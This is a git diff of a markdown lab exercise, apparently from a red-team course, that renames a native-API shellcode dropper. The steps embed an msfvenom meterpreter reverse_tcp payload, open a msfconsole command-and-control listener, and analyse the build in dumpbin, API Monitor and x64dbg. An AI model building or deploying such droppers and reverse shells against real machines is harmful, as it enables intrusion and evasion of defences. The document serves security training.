@@ -1,33 +1,33 @@
 ## Exercise 4: Medium_Level_API_Dropper
 In this exercise, we will make the first modification to the reference dropper and replace the Windows APIs (kernel32.dll) with native APIs (ntdll.dll).
-We create a **medium-level API shellcode dropper** in short **MLA-Dropper** based on native APIs. 
+We create a **medium-level API shellcode dropper** in short **Medium-Level-Dropper** based on native APIs. 
 ![medium_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235372969-4d24ddec-7ee5-443e-966a-24b3d70dc3a8.png)
 
 
 
 ## Exercice 4 tasks:
-### Create MLA-Dropper
-1. Create a new C++ POC in Visual Studio 2019 and use the provided code for the MLA-Dropper.
-2. Create staged x64 meterpreter shellcode with msfvenom and copy it to the C++ MLA-Dropper poc. 
-3. Compile the MLA-Dropper as release or debug x64. 
+### Create Medium-Level-Dropper
+1. Create a new C++ POC in Visual Studio 2019 and use the provided code for the Medium-Level-Dropper.
+2. Create staged x64 meterpreter shellcode with msfvenom and copy it to the C++ Medium-Level-Dropper poc. 
+3. Compile the Medium-Level-Dropper as release or debug x64. 
 4. Create and run a staged x64 meterpreter listener with msfconsole.
 5. Run your compiled .exe and verify that a stable command and control channel opens. 
-### Analyse MLA-Dropper
-6. Use the Visual Studio tool dumpbin to analyze the compiled MLA-Dropper. Is the result what you expected?  
-7. Use the API Monitor to analyze the compiled MLA-Dropper in the context of the four APIs used. Is the result what you expected? 
-8. Use the x64dbg debugger to analyze the compiled MLA dropper: from which module and location are the syscalls from the four APIs used being executed?
+### Analyse Medium-Level-Dropper
+6. Use the Visual Studio tool dumpbin to analyze the compiled Medium-Level-Dropper. Is the result what you expected?  
+7. Use the API Monitor to analyze the compiled Medium-Level-Dropper in the context of the four APIs used. Is the result what you expected? 
+8. Use the x64dbg debugger to analyze the compiled Medium-Level-Dropper: from which module and location are the syscalls from the four APIs used being executed?
 Is the result what you expected? 
 
 
 ## Visual Studio
-To create the MLA-Dropper project, follow the procedure of the high-level API dropper exercise, take a look to follow the necessary steps.
-We replace all Windows APIs with the corresponding native APIs and create our MLA-Dropper.
+To create the Medium-Level-Dropper project, follow the procedure of the High-Level-Dropper exercise, take a look to follow the necessary steps.
+We replace all Windows APIs with the corresponding native APIs and create our Medium-Level-Dropper.
 - NtAllocateVirtualMemory
 - NtWriteVirtualMemory
 - NtCreateThreadEx
 - NtWaitForSingleObject
 
-The code works as follows. Unlike the Windows APIs, most of the native APIs are not officially or partially documented by Microsoft and are therefore not intended for Windows OS developers. To use the native APIs in our MLA-Dropper, we must manually define the function pointers for the native API functions in the MLA-Dropper code.
+The code works as follows. Unlike the Windows APIs, most of the native APIs are not officially or partially documented by Microsoft and are therefore not intended for Windows OS developers. To use the native APIs in our Medium-Level-Dropper, we must manually define the function pointers for the native API functions in the Medium-Level-Dropper code.
 <details>
     
  ```
@@ -42,7 +42,7 @@ typedef NTSTATUS(NTAPI* PNTFREEVIRTUALMEMORY)(HANDLE, PVOID*, PSIZE_T, ULONG);
 </details>
     
     
-Shellcode declaration same as before in the high-level API dropper.
+Shellcode declaration same as before in the High-Level-Dropper.
 <details>
 
 ```
@@ -109,8 +109,8 @@ And finally we have to replace the Windows API WaitForSingleObject with the nati
 ```
 </details>    
 
-Here is the **complete code**, and you can copy and paste this code into your **MLA-Dropper** project in Visual Studio.
-You can also download the complete **MLA-Dropper Visual Studio project** in the **Code Example section** of this repository.
+Here is the **complete code**, and you can copy and paste this code into your **Medium-Level-Dropper** project in Visual Studio.
+You can also download the complete **Medium-Level-Dropper Visual Studio project** in the **Code Example section** of this repository.
 <details>
     
 ```
@@ -179,14 +179,14 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Ka
 <img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
 </p>
 
-The shellcode can then be copied into the MLA-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
+The shellcode can then be copied into the Medium-Level-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
 <img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
 </p>
 </details>    
 
 
 ## MSF-Listener
-Before we test the functionality of our MLA-Dropper, we need to create a listener within msfconsole.
+Before we test the functionality of our Medium-Level-Dropper, we need to create a listener within msfconsole.
 <details>
     
 **kali>**
@@ -208,7 +208,7 @@ run
 </details>
  
     
-Once the listener has been successfully started, you can run your compiled MLA-Dropper.exe. If all goes well, you should see an incoming command and control session. 
+Once the listener has been successfully started, you can run your compiled Medium-Level-Dropper.exe. If all goes well, you should see an incoming command and control session. 
 <details>
     
 <p align="center">
@@ -217,27 +217,27 @@ Once the listener has been successfully started, you can run your compiled MLA-D
 </details>
 
 
-## MLA-Dropper analysis: dumpbin 
+## Medium-Level-Dropper analysis: dumpbin 
 The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
 <details>    
     
 **cmd>**
 ```
 cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
-dumpbin /imports high_level.exe
+dumpbin /imports medium_level.exe
 ```
 </details>    
 
 <details>
     <summary>Solution</summary>    
-Compared to the high-level dropper, you can see that the medium-level dropper **no longer imports** the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject from kernel32.dll. This was expected and is correct.
+Compared to the High-Level-Dropper, you can see that the medium-level dropper **no longer imports** the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject from kernel32.dll. This was expected and is correct.
 <p align="center">
 <img width="729" alt="image" src="https://user-images.githubusercontent.com/50073731/235374656-117e0468-cd4d-4832-afb7-599cf94d2f1b.png">
 </p>
 </details>    
 
-## MLA-Dropper analysis: API-Monitor
-For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and the corresponding native APIs, we can be sure that there are no more transitions in context of the used APIs in our MLA-Dropper. We filter on the following API calls:
+## Medium-Level-Dropper analysis: API-Monitor
+For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and the corresponding native APIs, we can be sure that there are no more transitions in context of the used APIs in our Medium-Level-Dropper. We filter on the following API calls:
 - VirtualAlloc
 - NtAllocateVirtualMemory
 - WriteProcessMemory
@@ -249,20 +249,20 @@ For a correct check, it is necessary to filter to the correct APIs. Only by prov
 
 <details>
     <summary>Solution</summary>    
-If everything was done correctly, you could observe that there are more transitions from the Windows APIs to the native APIs we used in our MLA-Dropper poc.
-This result was expected and is correct because our MLA-Dropper accesses or imports the needed native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject directly from ntdll.dll.
+If everything was done correctly, you could observe that there are more transitions from the Windows APIs to the native APIs we used in our Medium-Level-Dropper poc.
+This result was expected and is correct because our Medium-Level-Dropper accesses or imports the needed native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject directly from ntdll.dll.
 <p align="center">
 <img width="522" alt="image" src="https://user-images.githubusercontent.com/50073731/235374864-c7e90dd6-82c6-49d1-a90c-b80a531416b3.png">
 </p>
 </details>    
 
-## MLA-Dropper analysis: x64dbg 
+## Medium-Level-Dropper analysis: x64dbg 
 Using x64dbg we want to validate from which module and location the respective system calls are executed in the context of the used Windows APIs -> native APIs?
 Remember, so far we have not implemented system calls or system call stubs directly in the dropper. What results would you expect?
 <details>
     <summary>Solution</summary>
     
-1. Open or load your MLA-Dropper.exe into x64dbg
+1. Open or load your Medium-Level-Dropper.exe into x64dbg
 2. Go to the Symbols tab, in the **left pane** in the **Modules column** select or highlight **ntdll.dll**, in the **right pane** in the **Symbols column** filter for the first native API **NtAllocateVirtualMemory**, right click and **"Follow in Dissassembler"**. To validate the other three native APIs, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject, just **repeat this procedure**. 
     
 <p align="center">    
